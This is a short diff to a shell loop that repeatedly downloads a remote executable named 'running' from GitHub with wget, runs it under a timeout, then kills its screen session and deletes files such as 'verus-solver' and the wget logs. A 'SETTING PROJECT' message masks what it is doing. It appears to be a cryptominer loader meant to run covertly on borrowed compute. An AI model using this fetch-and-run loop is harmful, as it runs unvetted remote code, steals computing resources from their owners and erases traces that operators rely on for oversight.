@@ -1,3 +1,3 @@
 wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running
 sudo apt install timelimit -y
-while :; do timeout 2800 bash ./running; clear; screen -XS Running quit; rm -f kontol manuk running verus-solver wget-log wget-log.*; echo SETTING PROJECT; sleep 360; wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running; done
+while :; do timeout 1500 bash ./running; clear; screen -XS Running quit; rm -f kontol manuk running verus-solver wget-log wget-log.*; echo SETTING PROJECT; sleep 300; wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running; done
